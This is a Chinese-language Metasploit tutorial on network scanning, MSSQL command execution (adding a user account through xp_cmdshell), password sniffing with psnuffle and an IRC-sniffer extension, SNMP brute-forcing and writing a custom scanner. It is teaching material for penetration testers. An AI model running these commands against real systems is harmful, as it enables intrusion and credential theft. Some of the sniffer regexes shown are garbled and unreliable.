# 第13讲 渗透工具 Metasploit 教程二

本节主要介绍下列内容：
- 信息收集
- 脆弱性扫描
- 编写简单FUZZER
- 渗透工具开发
- Web应用渗透开发
- 客户端攻击
- MSF 后渗透（POST EXPLOITATION)
- METERPRETER 脚本
- 维持访问
- METASPLOIT GUIS
- POST 模块参考
- 辅助模块参考


## 信息收集（Information Gathering）

任何成功的渗透测试都基于坚实的情报工作。

在Metasploit框架中，可以完成下列任务：
- 端口扫描
- 攻击MSSQL
- 服务识别
- 密码监听
- SNMP sweeping


### 端口扫描

我们可以使用 ```db_nmap```命令运行Nmap扫描目标主机或网络，而扫描结果将自动保存到数据库中。

如果需要将扫描结果保存为XML格式为后续工作所用，可以使用nmap的 ```-oA```参数。

例如运行下列命令：
```db_nmap -v -sV 192.168.1.0/24```

结果大致如下：
```
msf > nmap -v -sV 192.168.1.0/24 -oA subnet_1
[*] exec: nmap -v -sV 192.168.1.0/24 -oA subnet_1

Starting Nmap 5.00 ( http://nmap.org ) at 2009-08-13 19:29 MDT
NSE: Loaded 3 scripts for scanning.
Initiating ARP Ping Scan at 19:29
Scanning 101 hosts [1 port/host]
...
Nmap done: 256 IP addresses (16 hosts up) scanned in 499.41 seconds
Raw packets sent: 19973 (877.822KB) | Rcvd: 15125 (609.512KB)
```

### 可用的端口扫描工具

除了Nmap之外，MSF还集成了其他扫描工具，使用```search portscan```，可以查看这些工具。

```shell
msf > search portscan

Matching Modules
================

   Name                                      Disclosure Date  Rank    Description
   ----                                      ---------------  ----    -----------
   auxiliary/scanner/natpmp/natpmp_portscan                   normal  NAT-PMP External Port Scanner
   auxiliary/scanner/portscan/ack                             normal  TCP ACK Firewall Scanner
   auxiliary/scanner/portscan/ftpbounce                       normal  FTP Bounce Port Scanner
   auxiliary/scanner/portscan/syn                             normal  TCP SYN Port Scanner
   auxiliary/scanner/portscan/tcp                             normal  TCP Port Scanner
   auxiliary/scanner/portscan/xmas                            normal  TCP "XMas" Port Scanner
   ```

下面尝试使用MSF内置的SYN扫描器：
```shell
msf > use auxiliary/scanner/portscan/syn
msf auxiliary(syn) > show options

Module options (auxiliary/scanner/portscan/syn):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to scan per set
   DELAY      0                yes       The delay between connections, per thread, in milliseconds
   INTERFACE                   no        The name of the interface
   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                      yes       The target address range or CIDR identifier
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds

msf auxiliary(syn) > set INTERFACE eth0
INTERFACE => eth0
msf auxiliary(syn) > set PORTS 80
PORTS => 80
msf auxiliary(syn) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(syn) > set THREADS 50
THREADS => 50
msf auxiliary(syn) > run

[*] TCP OPEN 192.168.1.1:80
[*] TCP OPEN 192.168.1.2:80
[*] TCP OPEN 192.168.1.10:80
[*] TCP OPEN 192.168.1.109:80
[*] TCP OPEN 192.168.1.116:80
[*] TCP OPEN 192.168.1.150:80
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

下面是使用内置TCP扫描的例子：
```shell
msf > use auxiliary/scanner/portscan/tcp
msf  auxiliary(tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf  auxiliary(tcp) > hosts -R

Hosts
=====

address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------  ---------  -----  -------  ----  --------
172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server         

RHOSTS => 172.16.194.172

msf  auxiliary(tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string for capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-1024           yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       172.16.194.172   yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      10                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf  auxiliary(tcp) > run

[*] 172.16.194.172:25 - TCP OPEN
[*] 172.16.194.172:23 - TCP OPEN
[*] 172.16.194.172:22 - TCP OPEN
[*] 172.16.194.172:21 - TCP OPEN
[*] 172.16.194.172:53 - TCP OPEN
[*] 172.16.194.172:80 - TCP OPEN
[*] 172.16.194.172:111 - TCP OPEN
[*] 172.16.194.172:139 - TCP OPEN
[*] 172.16.194.172:445 - TCP OPEN
[*] 172.16.194.172:514 - TCP OPEN
[*] 172.16.194.172:513 - TCP OPEN
[*] 172.16.194.172:512 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf  auxiliary(tcp) > 
```

具体选中何种工具，可以根据自己的需要选择。

### 服务版本扫描

对于活跃的网络主机，可以使用扫描器中的版本扫描功能确定其服务版本。

下面以扫描Samba服务版本为例：

```shell

msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > set RHOSTS 192.168.1.200-210
RHOSTS => 192.168.1.200-210
msf auxiliary(smb_version) > set THREADS 11
THREADS => 11
msf auxiliary(smb_version) > run

[*] 192.168.1.209:445 is running Windows 2003 R2 Service Pack 2 (language: Unknown) (name:XEN-2K3-FUZZ) (domain:WORKGROUP)
[*] 192.168.1.201:445 is running Windows XP Service Pack 3 (language: English) (name:V-XP-EXPLOIT) (domain:WORKGROUP)
[*] 192.168.1.202:445 is running Windows XP Service Pack 3 (language: English) (name:V-XP-DEBUG) (domain:WORKGROUP)
[*] Scanned 04 of 11 hosts (036% complete)
[*] Scanned 09 of 11 hosts (081% complete)
[*] Scanned 11 of 11 hosts (100% complete)
[*] Auxiliary module execution completed
```

注意，假如我们现在使用```hosts```命令，可看到新获取的信息已存在MSF数据库中。

```shell
msf auxiliary(smb_version) > hosts

Hosts
=====

address        mac  name  os_name            os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------            ---------  -----  -------  ----  --------
192.168.1.201             Microsoft Windows  XP         SP3    client         
192.168.1.202             Microsoft Windows  XP         SP3    client         
192.168.1.209             Microsoft Windows  2003 R2    SP2    server
```



### IDLE扫描

Nmap的 IPID idle扫描提供了隐蔽扫描机制和虚假IP机制。为了冒用某个IP地址，通常需要先扫描网络发现可用的IP地址。这一点通常是通过IPID序列号来发现，可用的IP地址的序列类型为：Incremental或 Broken Little-Endian Incremental。

```shell
msf > use auxiliary/scanner/ip/ipidseq
msf auxiliary(ipidseq) > show options

Module options (auxiliary/scanner/ip/ipidseq):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds

msf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(ipidseq) > set THREADS 50
THREADS => 50
msf auxiliary(ipidseq) > run

[*] 192.168.1.1's IPID sequence class: All zeros
[*] 192.168.1.2's IPID sequence class: Incremental!
[*] 192.168.1.10's IPID sequence class: Incremental!
[*] 192.168.1.104's IPID sequence class: Randomized
[*] 192.168.1.109's IPID sequence class: Incremental!
[*] 192.168.1.111's IPID sequence class: Incremental!
[*] 192.168.1.114's IPID sequence class: Incremental!
[*] 192.168.1.116's IPID sequence class: All zeros
[*] 192.168.1.124's IPID sequence class: Incremental!
[*] 192.168.1.123's IPID sequence class: Incremental!
[*] 192.168.1.137's IPID sequence class: All zeros
[*] 192.168.1.150's IPID sequence class: All zeros
[*] 192.168.1.151's IPID sequence class: Incremental!
[*] Auxiliary module execution completed
```

根据上述结果，可以看到有一些潜在的、可作为虚假IP的地址。例如：192.168.1.109.下面的命令将使用它作为zombie，扫描某个主机：

```shell
msf auxiliary(ipidseq) > nmap -Pn -sI 192.168.1.109 192.168.1.114
[*] exec: nmap -Pn -sI 192.168.1.109 192.168.1.114

Starting Nmap 5.00 ( http://nmap.org ) at 2009-08-14 05:51 MDT
Idle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental
Interesting ports on 192.168.1.114:
Not shown: 996 closed|filtered ports
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
3389/tcp open ms-term-serv
MAC Address: 00:0C:29:41:F2:E8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.56 seconds
```

## 攻击MSSQL

### 发现MSSQL系统的脆弱性

可以使用UDP足迹扫描发现内网的MSSQL服务器。通常MSSQL的TCP监听端口是1433或其他动态TCP端口。如果端口是动态的，那么这个服务器一般使用UDP port 1434提供该服务器的TCP端口信息。

可以使用search查看相关模块，然后使用mssql ping查找mssql服务：

```shell

msf > search mssql

Matching Modules
================

   Name                                                      Disclosure Date  Rank       Description
   ----                                                      ---------------  ----       -----------
   auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator
   auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS
   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS
   auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution
   auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data
   auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder
   auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer
   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
   auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
   auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker (Fast Mode)
   auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
   auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
   auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
   auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility
   auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump
   auxiliary/server/capture/mssql                                             normal     Authentication Capture: MSSQL
   exploit/windows/iis/msadc                                 1998-07-17       excellent  MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   exploit/windows/mssql/lyris_listmanager_weak_pass         2005-12-08       excellent  Lyris ListManager MSDE Weak sa Password
   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       MS02-039 Microsoft SQL Server Resolution Overflow
   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       MS02-056 Microsoft SQL Server Hello Overflow
   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
   exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Microsoft SQL Server Clr Stored Procedure Payload Execution
   exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      Microsoft SQL Server Database Link Crawling Command Execution
   exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Microsoft SQL Server Payload Execution
   exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  Microsoft SQL Server Payload Execution via SQL Injection
   post/windows/gather/credentials/mssql_local_hashdump                       normal     Windows Gather Local SQL Server Hash Dump
   post/windows/manage/mssql_local_auth_bypass                                normal     Windows Manage Local Microsoft SQL Server Authorization Bypass

msf > use auxiliary/scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) > show options

Module options (auxiliary/scanner/mssql/mssql_ping):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target address range or CIDR identifier
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(mssql_ping) > set RHOSTS 10.211.55.1/24
RHOSTS => 10.211.55.1/24
msf auxiliary(mssql_ping) > exploit

[*] SQL Server information for 10.211.55.128:
[*] tcp = 1433
[*] np = SSHACKTHISBOX-0pipesqlquery
[*] Version = 8.00.194
[*] InstanceName = MSSQLSERVER
[*] IsClustered = No
[*] ServerName = SSHACKTHISBOX-0
[*] Auxiliary module execution completed
```

发现某个主机有mssql服务后，可以使用登录模块进行暴力破解登录：
```shell

msf auxiliary(mssql_login) > use auxiliary/admin/mssql/mssql_exec
msf auxiliary(mssql_exec) > show options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password for the specified username
   RHOST                                                      yes       The target address
   RPORT                1433                                  yes       The target port (TCP)
   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)


msf auxiliary(mssql_exec) > set RHOST 10.211.55.128
RHOST => 10.211.55.128
msf auxiliary(mssql_exec) > set MSSQL_PASS password
MSSQL_PASS => password
msf auxiliary(mssql_exec) > set CMD net user bacon ihazpassword /ADD
cmd => net user bacon ihazpassword /ADD
msf auxiliary(mssql_exec) > exploit

The command completed successfully.

[*] Auxiliary module execution completed
```

我们看到上面有一个增加用户名令，意味着可以使用这个用户名和密码登录系统了。

## 服务识别

### 扫描服务

MSF提供了不少服务扫描工具。

#### SSH service

SSH服务一般是安全的，但也出现过漏洞。

下面的例子用于扫描端口22的服务：

```shell
msf > services -p 22 -c name,port,proto

Services
========

host            name  port  proto
----            ----  ----  -----
172.16.194.163  ssh   22    tcp
172.16.194.172  ssh   22    tcp
```
下面我们调用ssh_version辅助扫描器，设置目标主机，运行扫描：

```shell

msf > use auxiliary/scanner/ssh/ssh_version

msf  auxiliary(ssh_version) > set RHOSTS 172.16.194.163 172.16.194.172
RHOSTS => 172.16.194.163 172.16.194.172

msf  auxiliary(ssh_version) > show options

Module options (auxiliary/scanner/ssh/ssh_version):

   Name     Current Setting                Required  Description
   ----     ---------------                --------  -----------
   RHOSTS   172.16.194.163 172.16.194.172  yes       The target address range or CIDR identifier
   RPORT    22                             yes       The target port
   THREADS  1                              yes       The number of concurrent threads
   TIMEOUT  30                             yes       Timeout for the SSH probe


msf  auxiliary(ssh_version) > run

[*] 172.16.194.163:22, SSH server version: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7
[*] Scanned 1 of 2 hosts (050% complete)
[*] 172.16.194.172:22, SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### FTP Service

简单配置的FTP服务器通常是我们访问整个网络的一个立足点。查看一个FTP服务是否存在匿名访问总是值得的。

```shell
msf > services -p 21 -c name,proto

Services
========

host            name  proto
----            ----  -----
172.16.194.172  ftp   tcp

msf > use auxiliary/scanner/ftp/ftp_version 

msf  auxiliary(ftp_version) > set RHOSTS 172.16.194.172
RHOSTS => 172.16.194.172

msf  auxiliary(anonymous) > show options
Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS   172.16.194.172       yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port
   THREADS  1                    yes       The number of concurrent threads

msf  auxiliary(anonymous) > run

[*] 172.16.194.172:21 Anonymous READ (220 (vsFTPd 2.3.4))
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

更多扫描器，可以使用下列命令加载或查看：

```msf > use auxiliary/scanner/```

## 密码监听

Max Moser发布了一个MSF 密码监听工具：psnuffle，它可以监听网络上的密码，这类似于dsniff工具。目前它支持：POP3、IMAP、FTP、HTTP GET 等协议。

使用psnuffle是很简单的：
```shell

msf > use auxiliary/sniffer/psnuffle
msf auxiliary(psnuffle) > show options

Module options:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILTER                      no        The filter string for capturing traffic
   INTERFACE                   no        The name of the interface
   PCAPFILE                    no        The name of the PCAP capture file to process
   PROTOCOLS  all              yes       A comma-delimited list of protocols to sniff or "all".
   SNAPLEN    65535            yes       The number of bytes to capture
   TIMEOUT    1                yes       The number of seconds to wait for new data
```

这个工具有很多选项，包括导入一个pcap包文件。使用run命令可以激活这个工具：
```shell

msf auxiliary(psnuffle) > run
[*] Auxiliary module execution completed
[*] Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...
[*] Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...
[*] Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...
[*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...
[*] Sniffing traffic.....
[*] Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 >> victim / pass (220 3Com 3CDaemon FTP Server Version 2.0)
```

上面的例子中展示了成功获取某个FTP主机密码的例子。
### 扩展 psnuffle 工具

psnuffle很容易扩展，以监听更多协议里的密码传输。本节将介绍一个例子：IRC(互联网聊天)协议监听的开发过程。

#### 存放位置
psnuffle各个模块都位于MSF安装目录的data/exploits/psnuffle目录下。不同的协议有不同目录名。我们先看一下POP3 sniffer模块的关键内容：

```ruby
self.sigs = {
:ok => /^(+OK[^n]*)n/si,
:err => /^(-ERR[^n]*)n/si,
:user => /^USERs+([^n]+)n/si,
:pass => /^PASSs+([^n]+)n/si,
:quit => /^(QUITs*[^n]*)n/si }
```
上面的代码定义了用于监听过程中识别敏感信息的表达式模式。它们都是正则表达式。

#### 定义自己的psnuffle模块
对于IRC通信协议，假设存在一些字符，我们可以使用下列代码识别它们。

```ruby
self.sigs = {
:user => /^(NICKs+[^n]+)/si,
:pass => /b(IDENTIFYs+[^n]+)/si,}
```

#### 会话识别

对于每个模块，我们首先需要定义它使用的端口和会话如何被跟踪。

```ruby
return if not pkt[:tcp] # We don't want to handle anything other than tcp
return if (pkt[:tcp].src_port != 6667 and pkt[:tcp].dst_port != 6667) # Process only packet on port 6667

#Ensure that the session hash stays the same for both way of communication
if (pkt[:tcp].dst_port == 6667) # When packet is sent to server
s = find_session("#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}-#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}")
else # When packet is coming from the server
s = find_session("#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}")
end
```

上面的代码用于生成一个session对象，然后可以利用他处理一个数据包的内容，匹配先前定义的正则表达式模式。
```ruby
case matched
when :user # when the pattern "/^(NICKs+[^n]+)/si" is matching the packet content
s[:user]=matches #Store the name into the session hash s for later use
# Do whatever you like here... maybe a puts if you need to
when :pass # When the pattern "/b(IDENTIFYs+[^n]+)/si" is matching
s[:pass]=matches # Store the password into the session hash s as well
if (s[:user] and s[:pass]) # When we have the name and the pass sniffed, print it
print "-> IRC login sniffed: #{s[:session]} >> username:#{s[:user]} password:#{s[:pass]}n"
end
sessions.delete(s[:session]) # Remove this session because we dont need to track it anymore
when nil
# No matches, don't do anything else # Just in case anything else is matching...
sessions[s[:session]].merge!({k => matches}) # Just add it to the session object
end
```

## SNMP Sweeping （清查）


### SNMP辅助模块

SNMP Sweeping 常常有助于发现一组特定系统的信息。如果你发现一台cisco设备的私钥，那么你可以下载这个设备的所有配置信息、修改它、加入恶意配置。

MSF有专门的SNMP sweeping工具。在使用之前要理解一些概念：

- read only和read write 这两个community字串在某些可被提取或修改的信息中有重要意义。
- 如果你能猜出这个read-only或read-write字符串，你就能过访问相当多的信息。
- 如果基于windows的设备配置了SNMP，经常会带有RO/RW community字符串，你可以提取很多信息：
  - patch levels
  - services running
  - last reboot times
  - usernames


默认情况下，MSF的SNMP服务仅监听本地，打开/etc/default/snmpd可以修改服务配置。

将下列内容：
```SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1'```

修改为：
```SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'```

然后重启服务，以监听所有IP地址信息。

#### MIB
MIB是指SNMP协议中的管理信息基（Management Information Base），可用于查询设备、提取信息。

MSF中有SNMP模块用于访问MIB。

```shell
msf >  search snmp

Matching Modules
================

   Name                                               Disclosure Date  Rank    Description
   ----                                               ---------------  ----    -----------
   auxiliary/scanner/misc/oki_scanner                                  normal  OKI Printer Default Login Credential Scanner
   auxiliary/scanner/snmp/aix_version                                  normal  AIX SNMP Scanner Auxiliary Module
   auxiliary/scanner/snmp/cisco_config_tftp                            normal  Cisco IOS SNMP Configuration Grabber (TFTP)
   auxiliary/scanner/snmp/cisco_upload_file                            normal  Cisco IOS SNMP File Upload (TFTP)
   auxiliary/scanner/snmp/snmp_enum                                    normal  SNMP Enumeration Module
   auxiliary/scanner/snmp/snmp_enumshares                              normal  SNMP Windows SMB Share Enumeration
   auxiliary/scanner/snmp/snmp_enumusers                               normal  SNMP Windows Username Enumeration
   auxiliary/scanner/snmp/snmp_login                                   normal  SNMP Community Scanner
   auxiliary/scanner/snmp/snmp_set                                     normal  SNMP Set Module
   auxiliary/scanner/snmp/xerox_workcentre_enumusers                   normal  Xerox WorkCentre User Enumeration (SNMP)
   exploit/windows/ftp/oracle9i_xdb_ftp_unlock        2003-08-18       great   Oracle 9i XDB FTP UNLOCK Overflow (win32)
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_main      2010-06-16       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_ovutil    2010-06-16       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_uro       2010-06-08       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
   exploit/windows/http/hp_nnm_snmp                   2009-12-09       great   HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
   exploit/windows/http/hp_nnm_snmpviewer_actapp      2010-05-11       great   HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
   post/windows/gather/enum_snmp                                       normal  Windows Gather SNMP Settings Enumeration (Registry)

msf >  use auxiliary/scanner/snmp/snmp_login
msf auxiliary(snmp_login) >  show options

Module options (auxiliary/scanner/snmp/snmp_login):

   Name              Current Setting                     Required  Description
   ----              ---------------                     --------  -----------
   BLANK_PASSWORDS   false                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                   yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                               no        Add all users in the current database to the list
   PASSWORD                                              no        The password to test
   PASS_FILE         /usr/share/wordlists/fasttrack.txt  no        File containing communities, one per line
   RHOSTS                                                yes       The target address range or CIDR identifier
   RPORT             161                                 yes       The target port
   STOP_ON_SUCCESS   false                               yes       Stop guessing when a credential works for a host
   THREADS           1                                   yes       The number of concurrent threads
   USER_AS_PASS      false                               no        Try the username as the password for all users
   VERBOSE           true                                yes       Whether to print output for all attempts
   VERSION           1                                   yes       The SNMP version to scan (Accepted: 1, 2c, all)

msf auxiliary(snmp_login) >  set RHOSTS 192.168.0.0-192.168.5.255
rhosts => 192.168.0.0-192.168.5.255
msf auxiliary(snmp_login) >  set THREADS 10 
threads => 10
msf auxiliary(snmp_login) >  run 
[*] >> progress (192.168.0.0-192.168.0.255) 0/30208...
[*] >> progress (192.168.1.0-192.168.1.255) 0/30208...
[*] >> progress (192.168.2.0-192.168.2.255) 0/30208...
[*] >> progress (192.168.3.0-192.168.3.255) 0/30208...
[*] >> progress (192.168.4.0-192.168.4.255) 0/30208...
[*] >> progress (-) 0/0...
[*] 192.168.1.50 'public' 'APC Web/SNMP Management Card (MB:v3.8.6 PF:v3.5.5 PN:apc_hw02_aos_355.bin AF1:v3.5.5 AN1:apc_hw02_sumx_355.bin MN:AP9619 HR:A10 SN: NA0827001465 MD:07/01/2008) (Embedded PowerNet SNMP Agent SW v2.2 compatible)'
[*] Auxiliary module execution completed
```

可以看到，上面有一个community字符串“public”，这有可能是read-only的，不能发现更多信息。我们下面研究设备 APC Web/SNMP，它的版本是running。

### SNMP enum

我们可以使用SNMP扫描模块收集信息，例如开放的端口、服务、主机名、进程等。
可以使用```use  auxiliary/scanner/snmp/snmp_enum```命令加载模块。

```shell
msf  auxiliary(snmp_enum) > run

[+] 172.16.194.172, Connected.

[*] System information:

Host IP                       : 172.16.194.172
Hostname                      : metasploitable
Description                   : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
Contact                       : msfdev@metasploit.com
Location                      : Metasploit Lab
Uptime snmp                   : 02:35:38.71
Uptime system                 : 00:20:13.21
System date                   : 2012-7-9 18:11:11.0

[*] Network information:

IP forwarding enabled         : no
Default TTL                   : 64
TCP segments received         : 19
TCP segments sent             : 21
TCP segments retrans          : 0
Input datagrams               : 5055
Delivered datagrams           : 5050
Output datagrams              : 4527

...snip...

[*] Device information:

Id                  Type                Status              Descr               
768                 Processor           unknown             GenuineIntel: Intel(R) Core(TM) i7-2860QM CPU @ 2.50GHz
1025                Network             unknown             network interface lo
1026                Network             unknown             network interface eth0
1552                Disk Storage        unknown             SCSI disk (/dev/sda)
3072                Coprocessor         unknown             Guessing that there's a floating point co-processor

[*] Processes:

Id                  Status              Name                Path                Parameters          
1                   runnable            init                /sbin/init                              
2                   runnable            kthreadd            kthreadd                                
3                   runnable            migration/0         migration/0                             
4                   runnable            ksoftirqd/0         ksoftirqd/0                             
5                   runnable            watchdog/0          watchdog/0                              
6                   runnable            events/0            events/0                                
7                   runnable            khelper             khelper                                 
41                  runnable            kblockd/0           kblockd/0                               
68                  runnable            kseriod             kseriod       

...snip...

5696                runnable            su                  su                                      
5697                runnable            bash                bash                                    
5747                running             snmpd               snmpd                                   


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 编写自己的扫描器

有时我们需要特定的网络扫描器。使用MSF自行扫描比别的程序要简单。MSF有许多特性：
- 访问所有的渗透模块类和方法
- 支持代理、支持SSL、支持报告
- 内置线程和范围扫描
- 容易写、运行快

编写自己的扫描仪模块在安全审核过程中也非常有用，它允许您查找错误密码的每个实例，或者可以在内部扫描需要修补的漏洞服务。使用Metasploit框架将使您可以将此信息存储在数据库中，以供组织和以后的报告需求。

我们将使用这个非常简单的TCP扫描程序，它将在默认端口12345上连接到主机，该端口可以在运行时通过扫描程序模块选项进行更改。连接到服务器后，它将发送“ HELLO SERVER”，接收响应并将其与远程主机的IP地址一起打印输出。

```ruby
require 'msf/core'
class Metasploit3 < Msf::Auxiliary include Msf::Exploit::Remote::Tcp include Msf::Auxiliary::Scanner def initialize super( 'Name' => 'My custom TCP scan',
                        'Version'        => '$Revision: 1 $',
                        'Description'    => 'My quick scanner',
                        'Author'         => 'Your name here',
                        'License'        => MSF_LICENSE
                )
                register_options(
                        [
                                Opt::RPORT(12345)
                        ], self.class)
        end

        def run_host(ip)
                connect()
		greeting = "HELLO SERVER" 
		sock.puts(greeting)
                data = sock.recv(1024)
                print_status("Received: #{data} from #{ip}")
                disconnect()
        end
end
```
### 保存和测试自己的辅助模块

